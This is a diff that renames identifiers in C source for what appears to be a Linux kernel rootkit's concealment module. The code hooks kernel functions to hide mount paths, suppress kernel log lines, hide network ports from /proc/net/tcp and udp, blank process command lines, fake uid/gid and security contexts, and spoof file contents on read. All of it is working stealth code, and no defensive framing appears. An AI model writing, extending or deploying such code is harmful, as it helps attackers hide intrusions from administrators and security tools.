@@ -36,13 +36,13 @@ typedef long (*neverc_krt_vfs_read_fn)(void *file, char __user *buf,
 /* ---- internal structs ---- */
 
 struct neverc_krt_mount_filter {
-	char paths[NEVERC_KRT_MOUNT_FILTER_MAX][NEVERC_KRT_MOUNT_PATH_MAX];
+	char paths[NEVERC_KRT_VIS_MOUNT_FILTER_MAX][NEVERC_KRT_VIS_MOUNT_PATH_MAX];
 	int  count;
 	int  active;
 };
 
-struct neverc_krt_net_hide_state {
-	u16 ports[NEVERC_KRT_NET_HIDE_PORT_MAX];
+struct neverc_krt_vis_net_state {
+	u16 ports[NEVERC_KRT_VIS_NET_PORT_MAX];
 	int count;
 	struct neverc_krt_interpose tcp4_interpose;
 	struct neverc_krt_interpose tcp6_interpose;
@@ -51,10 +51,10 @@ struct neverc_krt_net_hide_state {
 	int active;
 };
 
-struct neverc_krt_file_spoof_entry {
+struct neverc_krt_vis_file_spoof_entry {
 	char path[NEVERC_KRT_FILE_PATH_MAX];
-	char search[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
-	char replace[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
+	char search[NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN];
+	char replace[NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN];
 	int  search_len;
 	int  replace_len;
 };
@@ -67,7 +67,7 @@ static neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;
 
 static struct neverc_krt_interpose_ctx _neverc_krt_dmesg_ctx_interpose;
 static int                        _neverc_krt_dmesg_interposed;
-static char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
+static char _neverc_krt_dmesg_filters[NEVERC_KRT_VIS_DMESG_FILTER_MAX][NEVERC_KRT_VIS_DMESG_FILTER_LEN];
 static int                        _neverc_krt_dmesg_filter_cnt;
 static int                        _neverc_krt_dmesg_fmt_reg;
 
@@ -87,7 +87,7 @@ static neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
 static int                        _neverc_krt_proc_attr_interposed;
 static const char                *_neverc_krt_attr_fake_ctx;
 
-static struct neverc_krt_net_hide_state _neverc_krt_net_hide;
+static struct neverc_krt_vis_net_state _neverc_krt_vis_net;
 static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
 static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
 static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
@@ -96,14 +96,14 @@ static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;
 static struct neverc_krt_interpose     _neverc_krt_cmdline_interpose;
 static neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
 static int                        _neverc_krt_cmdline_interposed;
-static char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
-static int                        _neverc_krt_cmdline_filter_cnt;
+static char _neverc_krt_cmdline_filters[NEVERC_KRT_VIS_CMDLINE_FILTER_MAX][NEVERC_KRT_VIS_CMDLINE_FILTER_LEN];
+static int                        _neverc_krt_vis_cmdline_filter_cnt;
 
 static struct neverc_krt_interpose     _neverc_krt_vfs_read_interpose;
 static neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
 static int                        _neverc_krt_vfs_read_interposed;
-static struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
-static int                        _neverc_krt_file_spoof_cnt;
+static struct neverc_krt_vis_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_VIS_FILE_SPOOF_MAX];
+static int                        _neverc_krt_vis_file_spoof_cnt;
 static int                        _neverc_krt_file_dentry_probed;
 
 
@@ -111,16 +111,16 @@ static int                        _neverc_krt_file_dentry_probed;
 /*  /proc/mounts path filter                                            */
 /* ==================================================================== */
 
-int neverc_krt_mount_filter_add(const char *path)
+int neverc_krt_vis_mount_filter_add(const char *path)
 {
-	if (_neverc_krt_mnt_filter.count >= NEVERC_KRT_MOUNT_FILTER_MAX)
+	if (_neverc_krt_mnt_filter.count >= NEVERC_KRT_VIS_MOUNT_FILTER_MAX)
 		return -1;
 
 	int idx = _neverc_krt_mnt_filter.count;
 	const char *src = path;
 	char *dst = _neverc_krt_mnt_filter.paths[idx];
 	int i = 0;
-	while (*src && i < NEVERC_KRT_MOUNT_PATH_MAX - 1) {
+	while (*src && i < NEVERC_KRT_VIS_MOUNT_PATH_MAX - 1) {
 		dst[i++] = *src++;
 	}
 	dst[i] = '\0';
@@ -130,7 +130,7 @@ int neverc_krt_mount_filter_add(const char *path)
 
 static int _neverc_krt_mnt_path_match(const char *haystack)
 {
-	char buf[NEVERC_KRT_MOUNT_PATH_MAX];
+	char buf[NEVERC_KRT_VIS_MOUNT_PATH_MAX];
 	int plen = 0;
 	int i;
 
@@ -138,7 +138,7 @@ static int _neverc_krt_mnt_path_match(const char *haystack)
 		const char *path = _neverc_krt_mnt_filter.paths[i];
 		plen = 0;
 		while (path[plen]) plen++;
-		if (plen <= 0 || plen >= NEVERC_KRT_MOUNT_PATH_MAX)
+		if (plen <= 0 || plen >= NEVERC_KRT_VIS_MOUNT_PATH_MAX)
 			continue;
 		if (neverc_krt_mem_read(buf, haystack, plen))
 			continue;
@@ -176,7 +176,7 @@ static int _neverc_krt_mounts_show_filter(void *seq, void *v)
 	return _neverc_krt_orig_mounts_show_fn(seq, v);
 }
 
-int neverc_krt_mount_filter_install(void)
+int neverc_krt_vis_mount_filter_install(void)
 {
 	void *target;
 
@@ -196,7 +196,7 @@ int neverc_krt_mount_filter_install(void)
 	return 0;
 }
 
-void neverc_krt_mount_filter_cleanup(void)
+void neverc_krt_vis_mount_filter_cleanup(void)
 {
 	if (!_neverc_krt_mnt_filter.active) return;
 	if (_neverc_krt_mounts_interpose.active)
@@ -210,14 +210,14 @@ void neverc_krt_mount_filter_cleanup(void)
 /*  dmesg / kmsg log suppression                                        */
 /* ==================================================================== */
 
-int neverc_krt_dmesg_filter_add(const char *keyword)
+int neverc_krt_vis_dmesg_filter_add(const char *keyword)
 {
-	if (_neverc_krt_dmesg_filter_cnt >= NEVERC_KRT_DMESG_FILTER_MAX)
+	if (_neverc_krt_dmesg_filter_cnt >= NEVERC_KRT_VIS_DMESG_FILTER_MAX)
 		return -1;
 	int idx = _neverc_krt_dmesg_filter_cnt;
 	const char *s = keyword;
 	int i = 0;
-	while (*s && i < NEVERC_KRT_DMESG_FILTER_LEN - 1)
+	while (*s && i < NEVERC_KRT_VIS_DMESG_FILTER_LEN - 1)
 		_neverc_krt_dmesg_filters[idx][i++] = *s++;
 	_neverc_krt_dmesg_filters[idx][i] = '\0';
 	_neverc_krt_dmesg_filter_cnt++;
@@ -245,14 +245,14 @@ static void _neverc_krt_dmesg_ctx_handler(neverc_krt_reg_ctx *ctx)
 		ctx->force_jump = (u64)(unsigned long)_neverc_krt_dmesg_ret0;
 }
 
-int neverc_krt_dmesg_suppress_install(const char *module_name)
+int neverc_krt_vis_dmesg_suppress_install(const char *module_name)
 {
 	void *target;
 
 	if (_neverc_krt_dmesg_interposed) return 0;
 	if (!module_name) return -1;
 
-	neverc_krt_dmesg_filter_add(module_name);
+	neverc_krt_vis_dmesg_filter_add(module_name);
 
 	target = NEVERC_KRT_LOOKUP("vprintk_emit");
 	if (target) {
@@ -281,7 +281,7 @@ int neverc_krt_dmesg_suppress_install(const char *module_name)
 	return 0;
 }
 
-void neverc_krt_dmesg_suppress_cleanup(void)
+void neverc_krt_vis_dmesg_suppress_cleanup(void)
 {
 	if (!_neverc_krt_dmesg_interposed) return;
 	neverc_krt_interpose_remove_ctx(&_neverc_krt_dmesg_ctx_interpose);
@@ -316,7 +316,7 @@ static long _neverc_krt_kmsg_read_filter(void *filp, char __user *buf,
 	return ret;
 }
 
-int neverc_krt_kmsg_read_filter_install(void)
+int neverc_krt_vis_kmsg_read_filter_install(void)
 {
 	void *target;
 
@@ -334,7 +334,7 @@ int neverc_krt_kmsg_read_filter_install(void)
 	return 0;
 }
 
-void neverc_krt_kmsg_read_filter_cleanup(void)
+void neverc_krt_vis_kmsg_read_filter_cleanup(void)
 {
 	if (!_neverc_krt_kmsg_read_interposed) return;
 	neverc_krt_interpose_remove(&_neverc_krt_kmsg_read_interpose);
@@ -351,7 +351,7 @@ static void _neverc_krt_status_ctx_handler(neverc_krt_reg_ctx *ctx)
 	(void)ctx;
 }
 
-int neverc_krt_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
+int neverc_krt_vis_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
 {
 	void *target;
 
@@ -372,7 +372,7 @@ int neverc_krt_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
 	return 0;
 }
 
-void neverc_krt_proc_status_filter_cleanup(void)
+void neverc_krt_vis_proc_status_filter_cleanup(void)
 {
 	if (!_neverc_krt_proc_status_interposed) return;
 	neverc_krt_interpose_remove(&_neverc_krt_proc_status_interpose);
@@ -424,7 +424,7 @@ static long _neverc_krt_proc_attr_read_filter(void *file, char __user *buf,
 	return ret;
 }
 
-int neverc_krt_proc_attr_filter_install(const char *fake_context)
+int neverc_krt_vis_proc_attr_filter_install(const char *fake_context)
 {
 	void *target;
 
@@ -445,7 +445,7 @@ int neverc_krt_proc_attr_filter_install(const char *fake_context)
 	return 0;
 }
 
-void neverc_krt_proc_attr_filter_cleanup(void)
+void neverc_krt_vis_proc_attr_filter_cleanup(void)
 {
 	if (!_neverc_krt_proc_attr_interposed) return;
 	neverc_krt_interpose_remove(&_neverc_krt_proc_attr_interpose);
@@ -457,19 +457,19 @@ void neverc_krt_proc_attr_filter_cleanup(void)
 /*  /proc/net/tcp{,6} port hiding                                       */
 /* ==================================================================== */
 
-int neverc_krt_net_hide_add_port(u16 port)
+int neverc_krt_vis_net_add_port(u16 port)
 {
-	if (_neverc_krt_net_hide.count >= NEVERC_KRT_NET_HIDE_PORT_MAX)
+	if (_neverc_krt_vis_net.count >= NEVERC_KRT_VIS_NET_PORT_MAX)
 		return -1;
-	_neverc_krt_net_hide.ports[_neverc_krt_net_hide.count++] = port;
+	_neverc_krt_vis_net.ports[_neverc_krt_vis_net.count++] = port;
 	return 0;
 }
 
 static int _neverc_krt_net_port_hidden(u16 port)
 {
 	int i;
-	for (i = 0; i < _neverc_krt_net_hide.count; i++) {
-		if (_neverc_krt_net_hide.ports[i] == port)
+	for (i = 0; i < _neverc_krt_vis_net.count; i++) {
+		if (_neverc_krt_vis_net.ports[i] == port)
 			return 1;
 	}
 	return 0;
@@ -520,53 +520,53 @@ static int _neverc_krt_udp4_show_filter(void *seq, void *v)
 static int _neverc_krt_udp6_show_filter(void *seq, void *v)
 { return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_udp6_show); }
 
-int neverc_krt_net_hide_install(void)
+int neverc_krt_vis_net_install(void)
 {
 	void *target;
 
-	if (_neverc_krt_net_hide.active) return 0;
+	if (_neverc_krt_vis_net.active) return 0;
 
 	target = NEVERC_KRT_LOOKUP("tcp4_seq_show");
 	if (target)
-		neverc_krt_interpose_install(&_neverc_krt_net_hide.tcp4_interpose, target,
+		neverc_krt_interpose_install(&_neverc_krt_vis_net.tcp4_interpose, target,
 				 (void *)_neverc_krt_tcp4_show_filter,
 				 (void **)&_neverc_krt_orig_tcp4_show);
 
 	target = NEVERC_KRT_LOOKUP("tcp6_seq_show");
 	if (target)
-		neverc_krt_interpose_install(&_neverc_krt_net_hide.tcp6_interpose, target,
+		neverc_krt_interpose_install(&_neverc_krt_vis_net.tcp6_interpose, target,
 				 (void *)_neverc_krt_tcp6_show_filter,
 				 (void **)&_neverc_krt_orig_tcp6_show);
 
 	target = NEVERC_KRT_LOOKUP("udp4_seq_show");
 	if (target)
-		neverc_krt_interpose_install(&_neverc_krt_net_hide.udp4_interpose, target,
+		neverc_krt_interpose_install(&_neverc_krt_vis_net.udp4_interpose, target,
 				 (void *)_neverc_krt_udp4_show_filter,
 				 (void **)&_neverc_krt_orig_udp4_show);
 
 	target = NEVERC_KRT_LOOKUP("udp6_seq_show");
 	if (target)
-		neverc_krt_interpose_install(&_neverc_krt_net_hide.udp6_interpose, target,
+		neverc_krt_interpose_install(&_neverc_krt_vis_net.udp6_interpose, target,
 				 (void *)_neverc_krt_udp6_show_filter,
 				 (void **)&_neverc_krt_orig_udp6_show);
 
-	_neverc_krt_net_hide.active = 1;
+	_neverc_krt_vis_net.active = 1;
 	return 0;
 }
 
-void neverc_krt_net_hide_cleanup(void)
+void neverc_krt_vis_net_cleanup(void)
 {
-	if (!_neverc_krt_net_hide.active) return;
-	if (_neverc_krt_net_hide.udp6_interpose.active)
-		neverc_krt_interpose_remove(&_neverc_krt_net_hide.udp6_interpose);
-	if (_neverc_krt_net_hide.udp4_interpose.active)
-		neverc_krt_interpose_remove(&_neverc_krt_net_hide.udp4_interpose);
-	if (_neverc_krt_net_hide.tcp6_interpose.active)
-		neverc_krt_interpose_remove(&_neverc_krt_net_hide.tcp6_interpose);
-	if (_neverc_krt_net_hide.tcp4_interpose.active)
-		neverc_krt_interpose_remove(&_neverc_krt_net_hide.tcp4_interpose);
-	_neverc_krt_net_hide.active = 0;
-	_neverc_krt_net_hide.count = 0;
+	if (!_neverc_krt_vis_net.active) return;
+	if (_neverc_krt_vis_net.udp6_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_vis_net.udp6_interpose);
+	if (_neverc_krt_vis_net.udp4_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_vis_net.udp4_interpose);
+	if (_neverc_krt_vis_net.tcp6_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_vis_net.tcp6_interpose);
+	if (_neverc_krt_vis_net.tcp4_interpose.active)
+		neverc_krt_interpose_remove(&_neverc_krt_vis_net.tcp4_interpose);
+	_neverc_krt_vis_net.active = 0;
+	_neverc_krt_vis_net.count = 0;
 }
 
 
@@ -574,17 +574,17 @@ void neverc_krt_net_hide_cleanup(void)
 /*  /proc/pid/cmdline content filter                                    */
 /* ==================================================================== */
 
-int neverc_krt_cmdline_filter_add(const char *keyword)
+int neverc_krt_vis_cmdline_filter_add(const char *keyword)
 {
-	if (_neverc_krt_cmdline_filter_cnt >= NEVERC_KRT_CMDLINE_FILTER_MAX)
+	if (_neverc_krt_vis_cmdline_filter_cnt >= NEVERC_KRT_VIS_CMDLINE_FILTER_MAX)
 		return -1;
-	int idx = _neverc_krt_cmdline_filter_cnt;
+	int idx = _neverc_krt_vis_cmdline_filter_cnt;
 	const char *s = keyword;
 	int i = 0;
-	while (*s && i < NEVERC_KRT_CMDLINE_FILTER_LEN - 1)
+	while (*s && i < NEVERC_KRT_VIS_CMDLINE_FILTER_LEN - 1)
 		_neverc_krt_cmdline_filters[idx][i++] = *s++;
 	_neverc_krt_cmdline_filters[idx][i] = '\0';
-	_neverc_krt_cmdline_filter_cnt++;
+	_neverc_krt_vis_cmdline_filter_cnt++;
 	return 0;
 }
 
@@ -595,7 +595,7 @@ static long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
 	if (!_neverc_krt_orig_cmdline_read) return -1;
 
 	ret = _neverc_krt_orig_cmdline_read(file, buf, count, ppos);
-	if (ret <= 0 || !_neverc_krt_cmdline_filter_cnt)
+	if (ret <= 0 || !_neverc_krt_vis_cmdline_filter_cnt)
 		return ret;
 
 	if (_neverc_krt_copy_from_user && ret < 256) {
@@ -605,7 +605,7 @@ static long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
 		if (!missed) {
 			tmp[ret < 255 ? ret : 255] = '\0';
 			int k;
-			for (k = 0; k < _neverc_krt_cmdline_filter_cnt; k++) {
+			for (k = 0; k < _neverc_krt_vis_cmdline_filter_cnt; k++) {
 				if (_neverc_krt_str_contains(tmp,
 						      _neverc_krt_cmdline_filters[k]))
 					return 0;
@@ -615,7 +615,7 @@ static long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
 	return ret;
 }
 
-int neverc_krt_cmdline_filter_install(void)
+int neverc_krt_vis_cmdline_filter_install(void)
 {
 	void *target;
 
@@ -633,12 +633,12 @@ int neverc_krt_cmdline_filter_install(void)
 	return 0;
 }
 
-void neverc_krt_cmdline_filter_cleanup(void)
+void neverc_krt_vis_cmdline_filter_cleanup(void)
 {
 	if (!_neverc_krt_cmdline_interposed) return;
 	neverc_krt_interpose_remove(&_neverc_krt_cmdline_interpose);
 	_neverc_krt_cmdline_interposed = 0;
-	_neverc_krt_cmdline_filter_cnt = 0;
+	_neverc_krt_vis_cmdline_filter_cnt = 0;
 }
 
 
@@ -763,13 +763,13 @@ static long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
 	}
 
 	ret = _neverc_krt_orig_vfs_read(file, buf, count, pos);
-	if (ret <= 0 || !_neverc_krt_file_spoof_cnt || !_neverc_krt_copy_from_user ||
+	if (ret <= 0 || !_neverc_krt_vis_file_spoof_cnt || !_neverc_krt_copy_from_user ||
 	    !_neverc_krt_copy_to_user)
 		return ret;
 
 	int k;
-	for (k = 0; k < _neverc_krt_file_spoof_cnt; k++) {
-		struct neverc_krt_file_spoof_entry *e = &_neverc_krt_file_spoofs[k];
+	for (k = 0; k < _neverc_krt_vis_file_spoof_cnt; k++) {
+		struct neverc_krt_vis_file_spoof_entry *e = &_neverc_krt_file_spoofs[k];
 		if (!_neverc_krt_file_match_path(file, e->path))
 			continue;
 
@@ -804,15 +804,15 @@ static long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
 	return ret;
 }
 
-int neverc_krt_file_spoof_add(const char *path,
+int neverc_krt_vis_file_spoof_add(const char *path,
 			      const char *search, int slen,
 			      const char *replace, int rlen)
 {
-	if (_neverc_krt_file_spoof_cnt >= NEVERC_KRT_FILE_SPOOF_MAX)
+	if (_neverc_krt_vis_file_spoof_cnt >= NEVERC_KRT_VIS_FILE_SPOOF_MAX)
 		return -1;
 
-	struct neverc_krt_file_spoof_entry *e =
-		&_neverc_krt_file_spoofs[_neverc_krt_file_spoof_cnt];
+	struct neverc_krt_vis_file_spoof_entry *e =
+		&_neverc_krt_file_spoofs[_neverc_krt_vis_file_spoof_cnt];
 
 	int i = 0;
 	while (path[i] && i < NEVERC_KRT_FILE_PATH_MAX - 1) {
@@ -820,19 +820,19 @@ int neverc_krt_file_spoof_add(const char *path,
 	}
 	e->path[i] = '\0';
 
-	if (slen > NEVERC_KRT_FILE_SPOOF_MAX_LEN) slen = NEVERC_KRT_FILE_SPOOF_MAX_LEN;
-	if (rlen > NEVERC_KRT_FILE_SPOOF_MAX_LEN) rlen = NEVERC_KRT_FILE_SPOOF_MAX_LEN;
+	if (slen > NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN) slen = NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN;
+	if (rlen > NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN) rlen = NEVERC_KRT_VIS_FILE_SPOOF_MAX_LEN;
 
 	for (i = 0; i < slen; i++) e->search[i] = search[i];
 	e->search_len = slen;
 	for (i = 0; i < rlen; i++) e->replace[i] = replace[i];
 	e->replace_len = rlen;
 
-	_neverc_krt_file_spoof_cnt++;
+	_neverc_krt_vis_file_spoof_cnt++;
 	return 0;
 }
 
-int neverc_krt_file_spoof_install(void)
+int neverc_krt_vis_file_spoof_install(void)
 {
 	void *target;
 
@@ -850,10 +850,10 @@ int neverc_krt_file_spoof_install(void)
 	return 0;
 }
 
-void neverc_krt_file_spoof_cleanup(void)
+void neverc_krt_vis_file_spoof_cleanup(void)
 {
 	if (!_neverc_krt_vfs_read_interposed) return;
 	neverc_krt_interpose_remove(&_neverc_krt_vfs_read_interpose);
 	_neverc_krt_vfs_read_interposed = 0;
-	_neverc_krt_file_spoof_cnt = 0;
+	_neverc_krt_vis_file_spoof_cnt = 0;
 }
